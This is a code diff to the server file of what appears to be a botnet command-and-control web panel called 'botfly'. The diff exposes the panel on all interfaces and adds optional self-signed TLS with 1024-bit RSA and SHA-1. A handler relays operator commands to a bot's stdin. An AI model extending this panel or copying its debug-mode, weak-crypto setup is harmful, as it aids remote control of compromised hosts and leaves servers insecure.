@@ -1,10 +1,15 @@
+import eventlet
+eventlet.monkey_patch()
+
 import os
 import socket
-from flask import Flask, render_template, session, request, Response, send_file, jsonify
+from flask import Flask, render_template, request, Response, send_file
 from flask import make_response
-from flask_socketio import SocketIO, emit
+from flask_socketio import SocketIO
 from functools import wraps
 import json
+from OpenSSL import SSL, crypto
+
 
 # Loading library depends on how we want to setup the project later,
 # for now this will do
@@ -19,7 +24,8 @@ except:
 
  To run: python server.py'''
 
-HOST = 'localhost'
+HOSTNAME = 'botfly'
+HOST = '0.0.0.0'
 PORT = 1708
 UPLOAD_FOLDER = 'static/uploads/'
 DOWNLOAD_FOLDER = 'media/downloads/'
@@ -176,6 +182,29 @@ def send_command(cmd):
     if 'bot' in request.cookies:
         botnet.sendStdin(request.cookies.get('bot'), cmd['data'] + '\n')
 
+# Crypto stuff
+def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
+    C_F = os.path.join(cert_dir, certfile)
+    K_F = os.path.join(cert_dir, keyfile)
+    if not os.path.exists(C_F) or not os.path.exists(K_F):
+        k = crypto.PKey()
+        k.generate_key(crypto.TYPE_RSA, 1024)
+        cert = crypto.X509()
+        cert.get_subject().C = certargs["Country"]
+        cert.get_subject().ST = certargs["State"]
+        cert.get_subject().L = certargs["City"]
+        cert.get_subject().O = certargs["Organization"]
+        cert.get_subject().OU = certargs["Org. Unit"]
+        cert.get_subject().CN = HOSTNAME
+        cert.set_serial_number(1000)
+        cert.gmtime_adj_notBefore(0)
+        cert.gmtime_adj_notAfter(315360000)
+        cert.set_issuer(cert.get_subject())
+        cert.set_pubkey(k)
+        cert.sign(k, 'sha1')
+        open(C_F, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
+        open(K_F, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
+
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -187,43 +216,17 @@ if __name__ == "__main__":
     botnet.start()
     botserver.start()
 
-    socketio.run(app, debug=True, use_reloader=False,  port=5500)
-
-# TODO: implement HTTPS
-#
-#from OpenSSL import SSL, crypto
-#
-# # Crypto stuff
-# def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
-#     C_F = os.path.join(cert_dir, certfile)
-#     K_F = os.path.join(cert_dir, keyfile)
-#     if not os.path.exists(C_F) or not os.path.exists(K_F):
-#         k = crypto.PKey()
-#         k.generate_key(crypto.TYPE_RSA, 1024)
-#         cert = crypto.X509()
-#         cert.get_subject().C = certargs["Country"]
-#         cert.get_subject().ST = certargs["State"]
-#         cert.get_subject().L = certargs["City"]
-#         cert.get_subject().O = certargs["Organization"]
-#         cert.get_subject().OU = certargs["Org. Unit"]
-#         cert.get_subject().CN = HOSTNAME
-#         cert.set_serial_number(1000)
-#         cert.gmtime_adj_notBefore(0)
-#         cert.gmtime_adj_notAfter(315360000)
-#         cert.set_issuer(cert.get_subject())
-#         cert.set_pubkey(k)
-#         cert.sign(k, 'sha1')
-#         open(C_F, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
-#         open(K_F, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
-# def start_cert():
-#     CERT_FILE = "cert.pem"
-#     KEY_FILE = "key.pem"
-#     create_self_signed_cert(CERT_FILE, KEY_FILE,
-#                             certargs=
-#                             {"Country": "US",
-#                              "State": "NY",
-#                              "City": "Ithaca",
-#                              "Organization": "CHC",
-#                              "Org. Unit": "Side-Projects"})
-#     context = (CERT_FILE, KEY_FILE)
-#     app.run(host='0.0.0.0', debug=True, port=DEFAULT_PORT, ssl_context=context, threaded=True)
+    USE_SSL = False
+    if USE_SSL:
+        CERT_FILE = "cert.pem"
+        KEY_FILE = "key.pem"
+        create_self_signed_cert(CERT_FILE, KEY_FILE,
+                                certargs=
+                                {"Country": "US",
+                                 "State": "NY",
+                                 "City": "Ithaca",
+                                 "Organization": "CHC",
+                                 "Org. Unit": "Side-Projects"})
+        socketio.run(app, debug=True, use_reloader=False, certfile=CERT_FILE, keyfile=KEY_FILE, port=5500)
+    else:
+        socketio.run(app, debug=True, use_reloader=False, port=5500)
